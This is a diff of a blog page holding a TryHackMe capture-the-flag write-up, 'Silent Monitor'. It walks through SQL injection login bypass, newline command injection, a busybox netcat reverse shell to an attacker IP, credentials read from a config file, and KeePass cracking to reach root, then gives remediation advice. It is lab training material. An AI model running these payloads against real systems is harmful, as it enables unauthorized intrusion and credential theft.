@@ -1,101 +1,453 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Silent Monitor — OfflineDevc Writeups</title>
-  <link rel="stylesheet" href="../style.css" />
-  <link rel="preconnect" href="https://fonts.googleapis.com" />
-  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;600;700&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet" />
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Silent Monitor — Writeup | OfflineDevc</title>
+  <link rel="stylesheet" href="../style.css"/>
+  <link rel="preconnect" href="https://fonts.googleapis.com"/>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet"/>
 </head>
 <body>
-
+  <!-- NAV -->
   <nav class="navbar">
-    <div class="nav-inner">
-      <span class="nav-logo">&gt; OfflineDevc<span class="cursor">_</span></span>
-      <div class="nav-links">
-        <a href="../index.html#about">About</a>
-        <a href="../index.html#writeups">Writeups</a>
-        <a href="../index.html#contact">Contact</a>
-      </div>
+    <a href="../index.html" class="nav-logo">&lt;OfflineDevc/&gt;</a>
+    <div class="nav-links">
+      <a href="../index.html">Home</a>
+      <a href="../index.html#writeups">Writeups</a>
     </div>
   </nav>
 
-  <header class="writeup-hero">
-    <div class="writeup-hero-inner">
-      <a href="../index.html#writeups" class="back-link">← Back to Writeups</a>
-      <div class="card-header" style="margin-bottom:12px">
-        <span class="platform thm-badge">THM</span>
-        <span class="difficulty medium-badge">Medium</span>
+  <!-- WRITEUP HEADER -->
+  <section class="writeup-hero">
+    <div class="container">
+      <div class="writeup-meta-top">
+        <a href="../index.html#writeups" class="back-link">← All Writeups</a>
+        <span class="platform-badge thm">TryHackMe</span>
       </div>
       <h1 class="writeup-title">Silent Monitor</h1>
-      <p style="color:#666;font-size:14px;margin-top:8px">Linux (Ubuntu 22.04) · SQLi Auth Bypass → Newline Command Injection → Config Creds → SSH → KeePass → Root</p>
-      <div class="meta-row">
-        <div class="meta-item">🖥 OS: <span>Linux (Ubuntu 22.04)</span></div>
-        <div class="meta-item">🎯 Target: <span><code>10.48.130.140</code></span></div>
+      <div class="writeup-badges">
+        <span class="badge diff-hard">Hard</span>
+        <span class="badge badge-os">Linux</span>
       </div>
     </div>
-  </header>
+  </section>
 
-  <article class="writeup-content">
+  <!-- WRITEUP CONTENT -->
+  <main class="writeup-body">
+    <div class="container writeup-content">
+<h1 id="silent-monitor-tryhackme-writeup">Silent Monitor - TryHackMe Writeup</h1>
+<hr />
+<h2 id="1-executive-summary-machine-overview">1. Executive Summary &amp; Machine Overview</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Metric</th>
+<th style="text-align: left;">Details</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><strong>Room Name</strong></td>
+<td style="text-align: left;">Silent Monitor</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Platform</strong></td>
+<td style="text-align: left;">TryHackMe (Premium Room)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Operating System</strong></td>
+<td style="text-align: left;">Linux (Ubuntu 22.04.5 LTS)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Difficulty</strong></td>
+<td style="text-align: left;">Medium</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Target IP</strong></td>
+<td style="text-align: left;"><code>10.48.130.140</code></td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Attacker IP</strong></td>
+<td style="text-align: left;"><code>192.168.132.94</code></td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Key Attack Vectors</strong></td>
+<td style="text-align: left;">SQL Injection (Authentication Bypass) → OS Command Injection (Newline) → Credential Discovery in Config File → SSH Lateral Movement → KeePass Database Cracking → Root Password Recovery</td>
+</tr>
+</tbody>
+</table>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261113191424.png" /></p>
+<h3 id="attack-chain-summary">Attack Chain Summary</h3>
+<pre><code>Recon (Nmap)
+  ↓
+Port 5050 — CorpNet NOC Portal v2.4.1 (Werkzeug/Python)
+  ↓
+Gobuster → /internal (Login Page)
+  ↓
+SQL Injection: ' or 1=1 -- -  → Dashboard as &quot;netops&quot;
+  ↓
+Host Health Check → Command Injection via Burp Suite (newline in POST body)
+  ↓  127.0.0.1\nwhoami → www-data
+  ↓
+Reverse Shell: busybox nc 192.168.132.94 4444 -e /bin/sh
+  ↓
+www-data shell → /opt/netops/secret.config → sysadmin:********
+  ↓
+SSH as sysadmin → user.txt
+  ↓
+~/backups/infrastructure.kdbx → keepass2john + john → master password: ********
+  ↓
+KeePassXC → root:********
+  ↓
+su root → root.txt
+</code></pre>
+<hr />
+<h2 id="2-phase-1-reconnaissance-enumeration">2. Phase 1: Reconnaissance &amp; Enumeration</h2>
+<h3 id="21-port-scanning-nmap">2.1 Port Scanning (Nmap)</h3>
+<pre><code class="language-bash">nmap -sV -sC 10.48.130.140 -Pn
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261113174324.png" /></p>
+<p><strong>Results:</strong></p>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Port</th>
+<th style="text-align: left;">State</th>
+<th style="text-align: left;">Service</th>
+<th style="text-align: left;">Version</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">22/tcp</td>
+<td style="text-align: left;">open</td>
+<td style="text-align: left;">SSH</td>
+<td style="text-align: left;">OpenSSH 8.9p1 Ubuntu 3ubuntu0.15</td>
+</tr>
+<tr>
+<td style="text-align: left;">5050/tcp</td>
+<td style="text-align: left;">open</td>
+<td style="text-align: left;">HTTP</td>
+<td style="text-align: left;">Werkzeug httpd 2.0.2 (Python 3.10.12)</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>HTTP title: <strong>CorpNet Network Operations Centre</strong></li>
+<li>OS: Linux (<code>cpe:/o:linux:linux_kernel</code>)</li>
+</ul>
+<h3 id="22-web-application-enumeration">2.2 Web Application Enumeration</h3>
+<p>Browsing <code>http://10.48.130.140:5050</code> reveals the <strong>CorpNet Network Operations Centre Portal</strong> — an infrastructure monitoring dashboard.</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261113174401.png" /></p>
+<p>The portal shows: 14 Monitored Hosts, 3 Open Alerts, 99.4% Uptime, 4 Network Segments. Version: <strong>NOC Portal v2.4.1</strong>.</p>
+<h3 id="23-directory-brute-forcing-gobuster">2.3 Directory Brute-Forcing (Gobuster)</h3>
+<pre><code class="language-bash">gobuster dir -u http://10.48.130.140:5050 -w /usr/share/wordlists/dirb/common.txt -t 15
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261113174334.png" /></p>
+<p><strong>Result:</strong> Found <code>/internal</code> (Status: 200, Size: 8770).</p>
+<h3 id="24-login-page-discovery">2.4 Login Page Discovery</h3>
+<p>Navigating to <code>http://10.48.130.140:5050/internal</code> reveals an <strong>Operator Access</strong> login form: "Sign In to NOC Portal".</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261113174419.png" /></p>
+<hr />
+<h2 id="3-phase-2-sql-injection-initial-foothold">3. Phase 2: SQL Injection &amp; Initial Foothold</h2>
+<h3 id="31-sql-injection-authentication-bypass">3.1 SQL Injection — Authentication Bypass</h3>
+<p>We test a classic SQL injection payload in the USERNAME field:</p>
+<pre><code>' or 1=1 -- -
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261113174435.png" /></p>
+<p><strong>Result:</strong> We bypass authentication and are logged in as the <strong><code>netops</code></strong> operator.</p>
+<h3 id="32-dashboard-exploration">3.2 Dashboard Exploration</h3>
+<p>The authenticated dashboard at <code>/internal/dashboard</code> shows:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261113174446.png" /></p>
+<ul>
+<li><strong>System Overview</strong>: 12 Hosts Online, 2 Unreachable, 3 Open Alerts, 27 Log Entries</li>
+<li><strong>Service Status</strong>: SSH Daemon (<code>0.0.0.0:22</code>), NOC API (<code>0.0.0.0:5050</code>), SNMP Collector (<code>127.0.0.1:161</code>), Backup Agent (<code>127.0.0.1:8812</code>), Syslog Collector (<code>0.0.0.0:514</code>)</li>
+<li><strong>Network Segments</strong>: Management (<code>10.0.0.0/24</code>), Server VLAN (<code>10.0.1.0/24</code>), DMZ (<code>10.0.2.0/24</code>), User VLAN (<code>10.0.10.0/23</code>), OOB Management (<code>192.168.100.0/24</code>)</li>
+<li><strong>Audit Log</strong>: Shows previous failed SQLi attempts (<code>' OR 1=1#</code>, <code>admin' --</code>), and valid operator logins (<code>netops</code>, <code>jmartin</code>)</li>
+</ul>
+<h3 id="33-host-health-check-command-injection-discovery">3.3 Host Health Check — Command Injection Discovery</h3>
+<p>The <strong>Host Health</strong> page (<code>/internal/health</code>) provides an ICMP Connectivity Probe feature:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261113174457.png" /></p>
+<p>First, we try injecting <code>127.0.0.1;whoami</code> directly in the web form:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261113174513.png" /></p>
+<h3 id="34-bypassing-client-side-validation-with-burp-suite">3.4 Bypassing Client-Side Validation with Burp Suite</h3>
+<p>We intercept the POST request to <code>/internal/health</code> in <strong>Burp Suite Community Edition v2026.3.2</strong>:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261113174902.png" /></p>
+<p>The POST body parameter is <code>target=127.0.0.1</code>. We modify the request to inject a newline-based command injection:</p>
+<pre><code>target=127.0.0.1
+whoami
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261113174917.png" /></p>
+<p>The server executes <code>whoami</code> and returns <strong><code>www-data</code></strong> — confirming OS command injection via newline character.</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261113174934.png" /></p>
+<p>The output shows:</p>
+<pre><code>$ ping -c 2 -W 1 127.0.0.1 whoami
+ping: 127.0.0.1
+: Name or service not known
+www-data
+</code></pre>
+<h3 id="35-reverse-shell-via-command-injection">3.5 Reverse Shell via Command Injection</h3>
+<p>We craft a reverse shell payload in Burp Suite:</p>
+<pre><code>target=127.0.0.1
+busybox nc 192.168.132.94 4444 -e /bin/sh
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261113175056.png" /></p>
+<p>On our attacker machine, we listen with <strong>Penelope</strong> (enhanced netcat listener):</p>
+<pre><code class="language-bash">penelope nc -p 4444
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261113175110.png" /></p>
+<p><em>Forward the requests</em><br />
+<strong>Connection received!</strong> We get a reverse shell as <code>www-data</code> on <code>tryhackme-2204</code> (<code>10.48.130.140</code>).</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261113175137.png" /></p>
+<p>We land in <code>/opt/netops</code> as <code>www-data</code>.</p>
+<h3 id="36-credential-discovery-in-application-config">3.6 Credential Discovery in Application Config</h3>
+<p>Enumerating the application directory:</p>
+<pre><code class="language-bash">www-data@tryhackme-2204:/opt/netops$ ls
+app.py  netops.db  secret.config  templates
+www-data@tryhackme-2204:/opt/netops$ cat secret.config
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261113175219.png" /></p>
+<p>The <code>secret.config</code> file contains:</p>
+<pre><code class="language-ini"># netops application config
+# generated: 2026-01-03
 
-    <table class="info-table">
-      <tr><th>Room Name</th><td>Silent Monitor</td></tr>
-      <tr><th>Platform</th><td>TryHackMe</td></tr>
-      <tr><th>OS</th><td>Linux (Ubuntu 22.04.5 LTS)</td></tr>
-      <tr><th>Target IP</th><td>10.48.130.140</td></tr>
-      <tr><th>Difficulty</th><td>Medium</td></tr>
-      <tr><th>Key Techniques</th><td>SQLi, OS Command Injection (newline), Hardcoded Credentials, KeePass Cracking</td></tr>
-    </table>
+[database]
+path    = /opt/netops/netops.db
+timeout = 5
 
-    <h2>// Attack Chain</h2>
-    <div class="attack-chain">Recon (Nmap)
-  → Port 22 (SSH) · Port 5050 (Werkzeug — CorpNet NOC Portal v2.4.1)
-  → Gobuster → /internal (login page)
-  → SQL injection: ' or 1=1 -- - → login as netops
-  → Host Health Check → target=127.0.0.1\nwhoami → www-data
-  → Burp Suite → POST body newline injection
-  → busybox nc 192.168.132.94 4444 -e /bin/sh → shell as www-data
-  → /opt/netops/secret.config → sysadmin : ████████
-  → SSH sysadmin → user.txt → THM{████████████████████████████████}
-  → ~/backups/infrastructure.kdbx
-  → keepass2john + john → master: ████████
-  → KeePassXC → root : ████████
-  → su root → root.txt → THM{████████████████████████████████}</div>
+[app]
+host    = 0.0.0.0
+port    = 5050
+log_path = /var/log/netops/app.log
 
-    <h2>// Methodology</h2>
-    <p>This writeup follows the standard penetration testing lifecycle:
-    <strong>Reconnaissance</strong> → <strong>Enumeration</strong> → <strong>Exploitation</strong> →
-    <strong>Post-Exploitation</strong> → <strong>Privilege Escalation</strong> → <strong>Remediation</strong>.</p>
-    <p style="color:#555;font-size:13px;margin-top:12px">
-      📸 Full screenshot evidence is available in the original report.
-      Sensitive flags and credentials are redacted in compliance with TryHackMe guidelines.
-    </p>
+[auth]
+session_lifetime = 1800
 
-    <h2>// Tools Used</h2>
-    <ul style="color:#888;font-size:13px;line-height:2.2;margin-left:20px">
-      <li><code>Nmap</code></li>
-      <li><code>Gobuster</code></li>
-      <li><code>Burp Suite</code></li>
-      <li><code>Penelope</code></li>
-      <li><code>keepass2john</code></li>
-      <li><code>John the Ripper</code></li>
-      <li><code>KeePassXC</code></li>
-    </ul>
+# service account used by the backup agent
+# TODO: migrate to secrets manager before Q2 audit
+[backup_agent]
+run_as   = sysadmin
+password = ********
 
-  </article>
+[smtp]
+host = 127.0.0.1
+port = 25
+from = noc-alerts@corp.internal
+</code></pre>
+<blockquote>
+<p><strong>Credential Found:</strong> <code>sysadmin</code> : <code>********</code></p>
+</blockquote>
+<hr />
+<h2 id="4-phase-3-lateral-movement-ssh-as-sysadmin">4. Phase 3: Lateral Movement — SSH as sysadmin</h2>
+<h3 id="41-ssh-login">4.1 SSH Login</h3>
+<pre><code class="language-bash">ssh sysadmin@10.48.130.140
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261113175650.png" /></p>
+<p>Successfully logged in as <code>sysadmin@tryhackme-2204</code>. System: Ubuntu 22.04.5 LTS, Kernel 6.8.0-1017-aws x86_64.</p>
+<h3 id="42-user-flag">4.2 User Flag</h3>
+<pre><code class="language-bash">sysadmin@tryhackme-2204:~$ ls
+backups  user.txt
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261113175823.png" /></p>
+<pre><code class="language-bash">sysadmin@tryhackme-2204:~$ cat user.txt
+THM{********************************}
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261113175803.png" /></p>
+<blockquote>
+<p>🚩 <strong>User Flag:</strong> <code>THM{********************************}</code></p>
+</blockquote>
+<hr />
+<h2 id="5-phase-4-privilege-escalation-to-root">5. Phase 4: Privilege Escalation to Root</h2>
+<h3 id="51-keepass-database-discovery">5.1 KeePass Database Discovery</h3>
+<p>Exploring the <code>backups</code> directory in <code>sysadmin</code>'s home:</p>
+<pre><code class="language-bash">sysadmin@tryhackme-2204:~/backups$ ls
+README.txt  infrastructure.kdbx
+sysadmin@tryhackme-2204:~/backups$ cat README.txt
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261113175848.png" /></p>
+<p>The <code>README.txt</code> reads:</p>
+<pre><code>Backup archive — infrastructure credentials
 
+Periodic exports from the credential store are placed here by the backup agent.
+Treat all files in this directory as CONFIDENTIAL.
+
+infrastructure.kdbx — KeePass credential database
+
+Contact the sysadmin team lead if you require access.
+</code></pre>
+<h3 id="52-exfiltrating-the-keepass-database">5.2 Exfiltrating the KeePass Database</h3>
+<p>We transfer <code>infrastructure.kdbx</code> to our attacker machine via SCP:</p>
+<pre><code class="language-bash">scp sysadmin@10.48.130.140:/home/sysadmin/backups/infrastructure.kdbx .
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261113180322.png" /></p>
+<h3 id="53-cracking-the-keepass-master-password">5.3 Cracking the KeePass Master Password</h3>
+<p>We open KeePassXC and see the database is locked:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261113180338.png" /></p>
+<p>We extract the hash and crack it with <strong>John the Ripper</strong>:</p>
+<pre><code class="language-bash">keepass2john infrastructure.kdbx &gt; kdbx.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt kdbx.hash
+john kdbx.hash --show
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261113180523.png" /></p>
+<p><strong>Result:</strong></p>
+<pre><code>infrastructure:********
+1 password hash cracked, 0 left
+</code></pre>
+<blockquote>
+<p><strong>KeePass Master Password:</strong> <code>********</code></p>
+</blockquote>
+<h3 id="54-extracting-root-credentials-from-keepass">5.4 Extracting Root Credentials from KeePass</h3>
+<p>Opening <code>infrastructure.kdbx</code> in KeePassXC with the master password:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261113180618.png" /></p>
+<p>The database contains an entry in the <code>backup</code> group:</p>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Field</th>
+<th style="text-align: left;">Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><strong>Title</strong></td>
+<td style="text-align: left;">Root User Password - Sensitive</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Username</strong></td>
+<td style="text-align: left;"><code>root</code></td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Password</strong></td>
+<td style="text-align: left;"><code>********</code></td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Notes</strong></td>
+<td style="text-align: left;">root user password, remember to change later.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Expiration</strong></td>
+<td style="text-align: left;">5/18/40 11:00 AM</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Modified</strong></td>
+<td style="text-align: left;">5/19/26 9:59 AM</td>
+</tr>
+</tbody>
+</table>
+<h3 id="55-switching-to-root">5.5 Switching to Root</h3>
+<pre><code class="language-bash">sysadmin@tryhackme-2204:/var/log$ su root
+Password: ********
+root@tryhackme-2204:/var/log#
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261113180646.png" /></p>
+<h3 id="56-root-flag">5.6 Root Flag</h3>
+<pre><code class="language-bash">root@tryhackme-2204:~# cat root.txt
+THM{********************************}
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261113180706.png" /></p>
+<blockquote>
+<p>🚩 <strong>Root Flag:</strong> <code>THM{********************************}</code></p>
+</blockquote>
+<hr />
+<h2 id="6-security-mitigations-remediation">6. Security Mitigations &amp; Remediation</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Vulnerability</th>
+<th style="text-align: left;">Impact</th>
+<th style="text-align: left;">Recommended Remediation</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><strong>SQL Injection in Login Form</strong></td>
+<td style="text-align: left;">Complete authentication bypass; unauthorized access to monitoring dashboard and all operator functions.</td>
+<td style="text-align: left;">Use parameterized queries / prepared statements. Never concatenate user input into SQL strings.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>OS Command Injection (Newline in <code>ping</code>)</strong></td>
+<td style="text-align: left;">Remote Code Execution as <code>www-data</code>. Attacker gains interactive shell on the server.</td>
+<td style="text-align: left;">Sanitize all user input with strict allowlists (IPv4 regex). Use Python <code>subprocess</code> with argument lists instead of shell commands.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Client-Side Only Input Validation</strong></td>
+<td style="text-align: left;">Easily bypassed with Burp Suite or <code>curl</code>. Provides no security.</td>
+<td style="text-align: left;">Always enforce server-side validation. Client-side checks are UX only.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Hardcoded Credentials in Config File</strong></td>
+<td style="text-align: left;"><code>sysadmin</code> password in plaintext (<code>secret.config</code>) enables lateral movement via SSH.</td>
+<td style="text-align: left;">Use a secrets manager (e.g., HashiCorp Vault, AWS Secrets Manager). Never store passwords in application config files.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Weak KeePass Master Password</strong></td>
+<td style="text-align: left;"><code>spring</code> is trivially crackable with <code>rockyou.txt</code>. Exposes all stored credentials including root.</td>
+<td style="text-align: left;">Use a strong, unique master password (20+ characters, mixed case, numbers, symbols).</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Root Password Stored in KeePass</strong></td>
+<td style="text-align: left;">Full system compromise once KeePass is breached.</td>
+<td style="text-align: left;">Disable root password login. Use SSH key-based authentication and <code>sudo</code> with individual accounts.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="7-tools-used">7. Tools Used</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Tool</th>
+<th style="text-align: left;">Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><strong>Nmap</strong></td>
+<td style="text-align: left;">Port scanning and service enumeration</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Gobuster</strong></td>
+<td style="text-align: left;">Directory brute-forcing on port 5050</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Burp Suite CE</strong></td>
+<td style="text-align: left;">Intercepting and modifying HTTP POST requests for command injection</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Penelope</strong></td>
+<td style="text-align: left;">Enhanced reverse shell listener</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>SCP</strong></td>
+<td style="text-align: left;">Secure file transfer of <code>.kdbx</code> file</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>keepass2john</strong></td>
+<td style="text-align: left;">Extracting crackable hash from KeePass database</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>John the Ripper</strong></td>
+<td style="text-align: left;">Cracking KeePass master password with rockyou.txt</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>KeePassXC</strong></td>
+<td style="text-align: left;">Opening the decrypted KeePass database to extract root credentials</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>SSH</strong></td>
+<td style="text-align: left;">Remote login as <code>sysadmin</code> and <code>su root</code></td>
+</tr>
+</tbody>
+</table>
+    </div>
+  </main>
+
+  <!-- FOOTER -->
   <footer class="footer">
-    <div class="footer-inner">
-      <div class="footer-links">
-        <a href="https://github.com/OfflineDevc" target="_blank">GitHub</a>
-        <a href="https://tryhackme.com/p/Distowel" target="_blank">TryHackMe</a>
-        <a href="https://profile.hackthebox.com/profile/01a11ceb-de8c-7382-a00c-8fab28836ef1" target="_blank">HackTheBox</a>
-        <a href="https://www.linkedin.com/in/kun-poonkasetvatana-4b6317326/" target="_blank">LinkedIn</a>
-      </div>
-      <p class="footer-copy">© 2026 Kun Poonkasetvatana. Educational purposes only.</p>
-    </div>
+    <p>Built by <a href="https://github.com/OfflineDevc" target="_blank">OfflineDevc</a> · 
+       <a href="https://tryhackme.com/p/Distowel" target="_blank">TryHackMe</a> · 
+       <a href="https://www.linkedin.com/in/kun-poonkasetvatana-4b6317326/" target="_blank">LinkedIn</a></p>
   </footer>
-
 </body>
 </html>
